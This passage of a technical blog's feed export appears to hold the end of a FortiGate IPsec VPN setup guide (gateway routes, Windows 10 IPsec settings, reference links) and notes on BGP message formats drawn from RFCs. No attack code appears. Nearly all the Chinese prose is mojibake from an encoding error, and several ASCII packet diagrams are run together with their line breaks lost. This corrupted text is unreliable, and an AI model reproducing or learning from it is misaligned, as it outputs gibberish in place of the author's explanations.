alt="FortiGate1-Win10-VPN-Custom"></p><p>æœ€ç»ˆè¿æ¥çš„æ•ˆæœä¼šè®©è¿æ¥è€…æœ‰ä¸€ä¸ª<code>173.31.1.0/24</code>çš„<code>IP</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-IP.png" alt="Win10-IP"></p><h2 id="PC1-PC2-é…ç½®"><a href="#PC1-PC2-é…ç½®" class="headerlink" title="PC1 PC2 é…ç½®"></a>PC1 PC2 é…ç½®</h2><p>åŸºæœ¬ä¸éœ€è¦é…ç½®ï¼Œå› ä¸º<code>FortiGate1</code>å’Œ<code>FortiGate2</code>é…ç½®å¥½äº†ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸­é—´å‘åŒ…æ˜¯å¦æ˜¯<code>ESP</code>çš„</p><p>æœ€ä¸»è¦çš„é…ç½®ï¼Œéœ€è¦å°†<code>PC1</code>çš„ç½‘å…³è®¾ç½®ä¸º<code>192.168.159.3</code>ï¼Œ<code>PC2</code>çš„ç½‘å…³è®¾ç½®ä¸º<code>192.168.200.3</code></p><p>å¦åˆ™<code>PC1</code>è¦ä¹ˆç›´æ¥ä¸éœ€è¦éš§é“å°±å¯ä»¥åˆ°<code>PC2</code>ï¼Œè¦ä¹ˆå°±æ˜¯<code>PC1</code>ä¸èƒ½é€šè¿‡éš§é“èµ°åˆ°<code>PC2</code></p><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> route </span><span class="hljs-builtin-name">add</span><span class="hljs-built_in"> default </span>gw 192.168.159.3sudo<span class="hljs-built_in"> route </span><span class="hljs-builtin-name">add</span><span class="hljs-built_in"> default </span>gw 192.168.200.3</code></pre><p>å†…éƒ¨å¦‚æœéœ€è¦çœŸçš„ä¸Šç½‘ï¼Œåˆ™éœ€è¦å°†<code>fortigate1</code>å’Œ<code>fortigate2</code>é…ç½®ä¸€ä¸ªé™æ€çš„è·¯ç”±ï¼Œä»<code>0.0.0.0</code>å‡èµ°åˆ°<code>192.168.152.2</code>ï¼ˆå¦‚æœä¸ä¸Šç½‘ï¼Œå¯ä»¥ç›´æ¥è®¾ç½®<code>disable</code>ï¼‰ï¼Œç„¶åå†é…ç½®<code>pc1</code>å’Œ<code>pc2</code>çš„<code>DNS Server</code>å°±å¥½äº†</p><h2 id="Win10çš„é…ç½®"><a href="#Win10çš„é…ç½®" class="headerlink" title="Win10çš„é…ç½®"></a>Win10çš„é…ç½®</h2><p>å¯¹äº<code>Windows10</code>ï¼Œé€‰æ‹©<code>VPN</code>çš„åœ°æ–¹ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œå¦‚ä¸‹è®¾ç½®<br><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-IPSec-VPN.png" alt="Win10-IPSec-VPN"></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘è¿æ¥å¤±è´¥äº†ï¼Œé€šè¿‡æŠ“åŒ…å’ŒæŸ¥çœ‹<code>FortiGate1</code>çš„<code>debug log</code>ä»¥åŠæ”¯æŒçš„åå•†åŠ å¯†å’Œè®¤è¯ç®—æ³•ï¼Œå¯ä»¥æ¨æµ‹æ˜¯å› ä¸º<code>Win10</code>çš„åŠ å¯†ç®—æ³•éƒ½æ˜¯<code>AES</code>å’Œ<code>DES3</code>ï¼Œè€Œ<code>FortiGate</code>éƒ½æ˜¯<code>DES</code>ï¼Œæ‰€ä»¥ä¸€ç›´åå•†å¤±è´¥ï¼Œäºæ˜¯å°±éœ€è¦é…ç½®<code>Win10</code>çš„<code>IPSec</code>å±æ€§</p><p>åœ¨<code>é«˜çº§å®‰å…¨ Windows Defender é˜²ç«å¢™</code>å±æ€§ - <code>IPSec</code>è®¾ç½®ä¸­ï¼Œå¯ä»¥è‡ªå®šä¹‰è®¾ç½®<code>IPSec</code>ç”¨äºå»ºç«‹å®‰å…¨è¿æ¥çš„è®¾ç½®</p><p>åœ¨è‡ªå®šä¹‰è®¾ç½®ä¸­ï¼Œå°†å¯†é’¥äº¤æ¢ï¼ˆä¸»æ¨¡å¼ï¼‰ã€æ•°æ®ä¿æŠ¤ï¼ˆå¿«é€Ÿæ¨¡å¼ï¼‰ã€èº«ä»½éªŒè¯æ–¹å¼å‡è®¾ç½®ä¸ºé«˜çº§ï¼Œæœ€ä¸»è¦çš„æ˜¯ä¸ºäº†èƒ½åå•†æˆåŠŸ<br><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-IPSec-Setting-Main-Mode.png" alt="Win10-IPSec-Setting-Main-Mode"><br><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-IPSec-Setting-Quick-Mode.png" alt="Win10-IPSec-Setting-Quick-Mode"><br><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-IPSec-Setting-Auth.png" alt="Win10-IPSec-Setting-Auth"></p><p>ç„¶åè¿˜éœ€è¦é…ç½®å¦‚ä¸‹å†…å®¹çš„è¿æ¥å®‰å…¨è§„åˆ™ï¼Œè®°å¾—å‹¾é€‰ä½¿ç”¨<code>IPSec</code>éš§é“<br><img src="/img/FortiGate-IPsec-VPN-Setup/Win10-Defender-Security-Policy.png" alt="Win10-Defender-Security-Policy"></p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><blockquote><p><a href="https://github.com/hwdsl2/setup-ipsec-vpn/tree/master">https://github.com/hwdsl2/setup-ipsec-vpn/tree/master</a></p></blockquote><p><strong>DHCP NATé…ç½®</strong></p><blockquote><p><a href="https://handbook.fortinet.com.cn/%E7%AD%96%E7%95%A5%E4%B8%8E%E5%AF%B9%E8%B1%A1/%E5%8D%95%E7%BA%BF%E8%B7%AF%E4%B8%8A%E7%BD%91%E9%85%8D%E7%BD%AE/DHCP%E7%BA%BF%E8%B7%AF%E4%B8%8A%E7%BD%91%E9%85%8D%E7%BD%AE.html">https://handbook.fortinet.com.cn/ç­–ç•¥ä¸å¯¹è±¡/å•çº¿è·¯ä¸Šç½‘é…ç½®/DHCPçº¿è·¯ä¸Šç½‘é…ç½®.html</a><br><a href="https://blog.csdn.net/meigang2012/article/details/118978718">https://blog.csdn.net/meigang2012/article/details/118978718</a></p></blockquote><p><strong>IPSec VPNé…ç½®</strong></p><blockquote><p><a href="https://handbook.fortinet.com.cn/VPN%E6%8A%80%E6%9C%AF/%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%94%9F%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A5%E5%85%A5/Windows%E7%B3%BB%E7%BB%9F/Windows_IKEv1.html">https://handbook.fortinet.com.cn/VPNæŠ€æœ¯/ç³»ç»ŸåŸç”Ÿå®¢æˆ·ç«¯æ¥å…¥/Windowsç³»ç»Ÿ/Windows_IKEv1.html</a></p></blockquote><p><strong>Win10é…ç½®</strong></p><blockquote><p><a href="https://blog.csdn.net/qq_44484541/article/details/130057300">https://blog.csdn.net/qq_44484541/article/details/130057300</a></p></blockquote><p><strong>åç»­æŠ“åŒ…è§£å¯†</strong></p><blockquote><p><a href="https://blog.csdn.net/rfc2544/article/details/121063565">https://blog.csdn.net/rfc2544/article/details/121063565</a><br><a href="https://www.golinuxcloud.com/wireshark-decrypt-ipsec-packets-isakmp-esp/">https://www.golinuxcloud.com/wireshark-decrypt-ipsec-packets-isakmp-esp/</a></p></blockquote><p><strong>IPSec VPNæŠ¥æ–‡</strong></p><blockquote><p><a href="https://cshihong.github.io/2019/04/03/IPSec-VPN%E4%B9%8BIKE%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3">https://cshihong.github.io/2019/04/03/IPSec-VPNä¹‹IKEåè®®è¯¦è§£</a><br><a href="https://handbook.fortinet.com.cn/VPN%E6%8A%80%E6%9C%AF/IPSec_VPN/IPSec_VPN%E5%8E%9F%E7%90%86.html">https://handbook.fortinet.com.cn/VPNæŠ€æœ¯/IPSec_VPN/IPSec_VPNåŸç†.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FortiGate</tag>
      
      <tag>vpn</tag>
      
      <tag>IPsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BGPåè®®æ ¼å¼è®°å½•</title>
    <link href="/2023/08/29/BGP%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/08/29/BGP%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="BGPåè®®ä¸»ä½“æ ¼å¼"><a href="#BGPåè®®ä¸»ä½“æ ¼å¼" class="headerlink" title="BGPåè®®ä¸»ä½“æ ¼å¼"></a>BGPåè®®ä¸»ä½“æ ¼å¼</h2><p><code>BGP</code>åè®®ä¸»è¦ç”±<code>Header</code>å’Œ<code>BGP Message Types</code>ç»„æˆ</p><h3 id="Message-Header-Format"><a href="#Message-Header-Format" class="headerlink" title="Message Header Format"></a>Message Header Format</h3><p><code>Header</code>ç»“æ„ä¸º<code>Marker</code>ï¼ˆ16å­—èŠ‚ï¼‰ã€<code>Length</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>Type</code>ï¼ˆ1å­—èŠ‚ï¼‰ç»„æˆ<br><a href="https://www.rfc-editor.org/rfc/rfc4271#page-11">=&gt; RFC4271 Sec 4.1</a></p><pre><code class="hljs yaml"><span class="hljs-number">0</span>                   <span class="hljs-number">1</span>                   <span class="hljs-number">2</span>                   <span class="hljs-number">3</span><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><span class="hljs-string">|</span>                                                               <span class="hljs-string">|</span><span class="hljs-string">+</span>                                                               <span class="hljs-string">+</span><span class="hljs-string">|</span>                                                               <span class="hljs-string">|</span><span class="hljs-string">+</span>                                                               <span class="hljs-string">+</span><span class="hljs-string">|</span>                           <span class="hljs-string">Marker</span>                              <span class="hljs-string">|</span><span class="hljs-string">+</span>                                                               <span class="hljs-string">+</span><span class="hljs-string">|</span>                                                               <span class="hljs-string">|</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><span class="hljs-string">|</span>          <span class="hljs-string">Length</span>               <span class="hljs-string">|</span>      <span class="hljs-string">Type</span>     <span class="hljs-string">|</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></code></pre><p><code>Type</code>å­˜åœ¨ä»¥ä¸‹çŠ¶æ€ï¼š</p><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>- <span class="hljs-keyword">OPEN</span><span class="hljs-symbol">2 </span>- UPDATE<span class="hljs-symbol">3 </span>- NOTIFICATION<span class="hljs-symbol">4 </span>- KEEPALIVE<span class="hljs-symbol">5 </span>- ROUTE-REFRESH<span class="hljs-symbol">6 </span>- DYNAMIC CAPABILITY</code></pre><p>P.S <code>Type: 5 - ROUTE-REFRESH</code>å‡ºè‡ª <a href="https://www.rfc-editor.org/rfc/rfc2918.html">RFC2918 Sec 3.</a><br><code>Type: 6 - DYNAMIC CAPABILITY</code>å‡ºè‡ª <a href="https://datatracker.ietf.org/doc/html/draft-ietf-idr-dynamic-cap-16#section-3">draft-ietf-idr-dynamic-cap-16 Sec 3.</a></p><h3 id="OPEN-Message-Format"><a href="#OPEN-Message-Format" class="headerlink" title="OPEN Message Format"></a>OPEN Message Format</h3><p><code>Open</code>ç»“æ„ä¸º<code>Version</code>ï¼ˆ1å­—èŠ‚ï¼‰ã€<code>My Autonomous System</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>Hold Time</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>BGP Identifier</code>ï¼ˆ4å­—èŠ‚ï¼Œ<code>BGP IP</code>ï¼‰ã€<code>Optional Parameters Length</code>ï¼ˆ1å­—èŠ‚ï¼‰ã€<code>Optional Parameters</code>ï¼ˆå˜é•¿ï¼‰<br><a href="https://www.rfc-editor.org/rfc/rfc4271#page-12">=&gt; RFC4271 Sec 4.2</a></p><pre><code class="hljs asciidoc">0                   1                   2                   30 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|    Version    |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|     My Autonomous System      |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|           Hold Time           |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|                         BGP Identifier                        |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+| Opt Parm Len  |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|                                                               ||             Optional Parameters (variable)                    ||                                                               |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+</code></pre><pre><code class="hljs angelscript"><span class="hljs-number">0</span>                   <span class="hljs-number">1</span><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-...|  Parm. Type   | Parm. Length  |  Parameter Value (variable)+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-...</code></pre><p><code>Optional Parameters</code>å†…éƒ¨ç»“æ„ä¸º1ä¸ªæˆ–å¤šä¸ª<code>&lt;Parameter Type, Parameter Length, Parameter Value&gt;</code>ä¸‰å…ƒç»„ï¼ˆ1å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œxå­—èŠ‚ï¼‰</p><pre><code class="hljs fortran">This field <span class="hljs-keyword">contains</span> a list of <span class="hljs-keyword">optional</span> parameters, <span class="hljs-keyword">in</span> which each <span class="hljs-keyword">parameter</span> is encoded as a &lt;<span class="hljs-keyword">Parameter</span> <span class="hljs-keyword">Type</span>, <span class="hljs-keyword">Parameter</span> Length, <span class="hljs-keyword">Parameter</span> <span class="hljs-keyword">Value</span>&gt; triplet<span class="hljs-number">.</span></code></pre><p><code>Parameter Type</code>å¯ä»¥ä¸º<code>Reserved</code>ï¼ˆ<code>Parameter Type 0</code>ï¼‰ã€<code>Authentication (deprecated)</code>ï¼ˆ<code>Parameter Type 1</code>ï¼‰ã€<code>Capability Codes</code>ï¼ˆ<code>Parameter Type 2</code>ï¼‰</p><p>æœ€å¸¸ç”¨çš„è¿˜æ˜¯<code>Capability Codes</code>ï¼Œå…¶å†…éƒ¨æ ¼å¼ä¸º1ä¸ªæˆ–å¤šä¸ª<code>&lt;Capability Code, Capability Length, Capability Value&gt;</code>ä¸‰å…ƒç»„<br><a href="https://www.rfc-editor.org/rfc/rfc3392">=&gt; RFC3392 Sec 4.</a></p><pre><code class="hljs asciidoc"><span class="hljs-code">+------------------------------+</span>| Capability Code (1 octet)    |<span class="hljs-code">+------------------------------+</span>| Capability Length (1 octet)  |<span class="hljs-code">+------------------------------+</span>| Capability Value (variable)  |<span class="hljs-code">+------------------------------+</span></code></pre><p>å…¶ä¸­<code>Capability-Code</code>å¯ä¸ºå¦‚ä¸‹çš„å€¼</p><p><img src="/img/BGP-Format/BGP-Open-Capability-Codes.png" alt="BGP-Open-Capability-Codes.png"><br><a href="https://www.iana.org/assignments/capability-codes/capability-codes.xhtml">=&gt; IANA-Capability-Codes</a></p><p>æ•´ä¸ªç»“æ„å¦‚ä¸‹</p><pre><code class="hljs mermaid">graph LRX(Optional Parameters)--&gt; T1(Opt Param tuple)T1(Opt Param tuple)--&gt; A(&quot;Parameter Type(if Capability Codes)&quot;)T1(Opt Param tuple)--&gt; B(Parameter Length)T1(Opt Param tuple)--&gt; C(Parameter Value)C(Parameter Value)--&gt; CT1(Cap Code tuple)CT1(Cap Code tuple)--&gt; CTA(Capability Code)CT1(Cap Code tuple)--&gt; CTB(Capability Length)CT1(Cap Code tuple)--&gt; CTC(Capability Value)C(Parameter Value)--&gt; CT2(...)X(Optional Parameters)--&gt; T2(...)</code></pre><h4 id="1-Multiprotocol-Extensions-for-BGP-4"><a href="#1-Multiprotocol-Extensions-for-BGP-4" class="headerlink" title="(1) Multiprotocol Extensions for BGP-4"></a>(1) Multiprotocol Extensions for BGP-4</h4><p><code>Capability Code</code>å­—æ®µä¸º1<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å¦‚ä¸‹ï¼š<code>Address Family Identifier</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>Reserved</code>ï¼ˆ1å­—èŠ‚ï¼Œé»˜è®¤ä¸º0ï¼‰ã€<code>Subsequent Address Family Identifier</code>ï¼ˆ1å­—èŠ‚ï¼‰</p><pre><code class="hljs asciidoc">0       7      15      23      31<span class="hljs-code">+-------+</span>-------<span class="hljs-code">+-------+</span>-------+|      AFI      | Res.  | SAFI  |<span class="hljs-code">+-------+</span>-------<span class="hljs-code">+-------+</span>-------+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc2858.html#section-7">=&gt; RFC2858 Sec 7.</a></p><h4 id="2-Route-Refresh-Capability-for-BGP-4"><a href="#2-Route-Refresh-Capability-for-BGP-4" class="headerlink" title="(2) Route Refresh Capability for BGP-4"></a>(2) Route Refresh Capability for BGP-4</h4><p><code>Capability Code</code>å­—æ®µä¸º2<br><code>Capability Length</code>å­—æ®µä¸º0<br><a href="https://www.rfc-editor.org/rfc/rfc2918.html#section-2">=&gt; RFC2918 Sec 2.</a></p><h4 id="3-Outbound-Route-Filtering-Capability"><a href="#3-Outbound-Route-Filtering-Capability" class="headerlink" title="(3) Outbound Route Filtering Capability"></a>(3) Outbound Route Filtering Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º3<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸ºä¸€ä¸ªæˆ–è€…å¤šä¸ªå¦‚ä¸‹ç»“æ„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------------------------------------------+</span>| Address Family Identifier (2 octets)             |<span class="hljs-code">+--------------------------------------------------+</span>| Reserved (1 octet)                               |<span class="hljs-code">+--------------------------------------------------+</span>| Subsequent Address Family Identifier (1 octet)   |<span class="hljs-code">+--------------------------------------------------+</span>| Number of ORFs (1 octet)                         |<span class="hljs-code">+--------------------------------------------------+</span>| ORF Type (1 octet)                               |<span class="hljs-code">+--------------------------------------------------+</span>| Send/Receive (1 octet)                           |<span class="hljs-code">+--------------------------------------------------+</span>| ...                                              |<span class="hljs-code">+--------------------------------------------------+</span>| ORF Type (1 octet)                               |<span class="hljs-code">+--------------------------------------------------+</span>| Send/Receive (1 octet)                           |<span class="hljs-code">+--------------------------------------------------+</span></code></pre><p>å…¶ä¸­<code>Send/Receive</code>å€¼åªèƒ½ä¸º1ã€2ã€3<br><a href="https://www.rfc-editor.org/rfc/rfc5291.html#section-5">=&gt; RFC5291 Sec 5.</a></p><h4 id="4-Multiple-routes-to-a-destination-capability-deprecated"><a href="#4-Multiple-routes-to-a-destination-capability-deprecated" class="headerlink" title="(4) Multiple routes to a destination capability (deprecated)"></a>(4) Multiple routes to a destination capability (deprecated)</h4><p><code>Capability Code</code>å­—æ®µä¸º4<br>ä½†æ˜¯è¢«å¼ƒç”¨<br><a href="https://www.rfc-editor.org/rfc/rfc8277.html#section-6">=&gt; RFC8277 Sec 6.</a></p><h4 id="5-Extended-Next-Hop-Encoding"><a href="#5-Extended-Next-Hop-Encoding" class="headerlink" title="(5) Extended Next Hop Encoding"></a>(5) Extended Next Hop Encoding</h4><p><code>Capability Code</code>å­—æ®µä¸º5<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿</p><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------------------------+</span>| NLRI AFI - 1 (2 octets)                             |<span class="hljs-code">+-----------------------------------------------------+</span>| NLRI SAFI - 1 (2 octets)                            |<span class="hljs-code">+-----------------------------------------------------+</span>| Nexthop AFI - 1 (2 octets)                          |<span class="hljs-code">+-----------------------------------------------------+</span>| .....                                               |<span class="hljs-code">+-----------------------------------------------------+</span>| NLRI AFI - N (2 octets)                             |<span class="hljs-code">+-----------------------------------------------------+</span>| NLRI SAFI - N (2 octets)                            |<span class="hljs-code">+-----------------------------------------------------+</span>| Nexthop AFI - N (2 octets)                          |<span class="hljs-code">+-----------------------------------------------------+</span></code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc8950.html#section-4">=&gt; RFC8950 Sec 4.</a></p><h4 id="6-BGP-Extended-Message"><a href="#6-BGP-Extended-Message" class="headerlink" title="(6) BGP Extended Message"></a>(6) BGP Extended Message</h4><p><code>Capability Code</code>å­—æ®µä¸º6<br><code>Capability Length</code>å­—æ®µä¸º0<br><a href="https://www.rfc-editor.org/rfc/rfc8654.html#section-3">=&gt; RFC8654 Sec 3.</a></p><h4 id="7-BGPsec-Capability"><a href="#7-BGPsec-Capability" class="headerlink" title="(7) BGPsec Capability"></a>(7) BGPsec Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º7<br><code>Capability Length</code>å­—æ®µä¸º3<br><code>Capability Value</code>å­—æ®µå¦‚ä¸‹</p><pre><code class="hljs asciidoc"><span class="hljs-code">  0   1   2   3      4      5   6   7</span><span class="hljs-code">+---------------------------------------+</span>| Version          | Dir |  Unassigned  |<span class="hljs-code">+---------------------------------------+</span>|                                       |<span class="hljs-code">+------           AFI              -----+</span>|                                       |<span class="hljs-code">+---------------------------------------+</span></code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc8205.html#section-2.1">=&gt; RFC8205 Sec 2.1.</a></p><h4 id="8-Multiple-Labels-Capability"><a href="#8-Multiple-Labels-Capability" class="headerlink" title="(8) Multiple Labels Capability"></a>(8) Multiple Labels Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º8<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸ºä¸€ä¸ªæˆ–å¤šä¸ª<code>&lt;AFI, SAFI, Count&gt;</code>ä¸‰å…ƒç»„</p><pre><code class="hljs angelscript"> <span class="hljs-number">0</span>                   <span class="hljs-number">1</span>                   <span class="hljs-number">2</span>                   <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|              AFI              |    SAFI       |    Count      ~+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~              AFI              |    SAFI       |    Count      |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc8277.html#section-2.1">=&gt; RFC8277 Sec 2.1.</a></p><h4 id="9-BGP-Role"><a href="#9-BGP-Role" class="headerlink" title="(9) BGP Role"></a>(9) BGP Role</h4><p><code>Capability Code</code>å­—æ®µä¸º9<br><code>Capability Length</code>å­—æ®µä¸º1<br><code>Capability Value</code>å­—æ®µå¦‚ä¸‹</p><pre><code class="hljs routeros">ValueRole name (<span class="hljs-keyword">for</span> the local AS)0Provider1RS2RS-Client3Customer4<span class="hljs-built_in">Peer </span>(i.e., Lateral Peer)5-255Unassigned</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc9234.html#name-bgp-role-capability">=&gt; RFC9234 Sec 4.1.</a></p><h4 id="64-Graceful-Restart-Capability"><a href="#64-Graceful-Restart-Capability" class="headerlink" title="(64) Graceful Restart Capability"></a>(64) Graceful Restart Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º64<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸º<code>ReStart Flags</code>ã€<code>Restart Time in seconds</code>å’Œä¸€ä¸ªæˆ–å¤šä¸ª<code>&lt;AFI, SAFI, Flags for Address Family&gt;</code>ä¸‰å…ƒç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------------------------------------------+</span>| Restart Flags (4 bits)                           |<span class="hljs-code">+--------------------------------------------------+</span>| Restart Time in seconds (12 bits)                |<span class="hljs-code">+--------------------------------------------------+</span>| Address Family Identifier (16 bits)              |<span class="hljs-code">+--------------------------------------------------+</span>| Subsequent Address Family Identifier (8 bits)    |<span class="hljs-code">+--------------------------------------------------+</span>| Flags for Address Family (8 bits)                |<span class="hljs-code">+--------------------------------------------------+</span>| ...                                              |<span class="hljs-code">+--------------------------------------------------+</span>| Address Family Identifier (16 bits)              |<span class="hljs-code">+--------------------------------------------------+</span>| Subsequent Address Family Identifier (8 bits)    |<span class="hljs-code">+--------------------------------------------------+</span>| Flags for Address Family (8 bits)                |<span class="hljs-code">+--------------------------------------------------+</span>Restart Flags:<span class="hljs-code"> 0 1 2 3</span><span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|R|Resv.|<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+Flags for Address Family:<span class="hljs-code"> 0 1 2 3 4 5 6 7</span><span 